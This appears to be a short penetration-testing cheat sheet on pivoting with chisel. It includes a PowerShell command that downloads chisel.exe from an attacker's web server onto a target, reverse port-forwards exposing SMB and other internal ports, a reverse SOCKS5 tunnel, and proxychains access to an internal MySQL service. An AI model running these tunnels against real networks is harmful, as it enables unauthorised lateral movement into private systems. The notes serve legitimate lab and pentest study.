https://github.com/jpillora/chisel/releases

```bash
Invoke-WebRequest -Uri http://<ip>:8000/chisel.exe -OutFile chisel.exe
```

```bash
./chisel.exe client <ip>:8080 R:445:localhost:445

chisel client <ip>:8080 R:3000:localhost:3000

chisel server --reverse --socks5
.\chisel.exe server --reverse --socks5
```
## Proxychains
```bash
chisel server --reverse --socks5 --port 9999

chisel client <ip>:9999 R:socks

proxychains mysql -u username -p password -h 127.0.0.1:1080
```

## Port Forwarding
https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/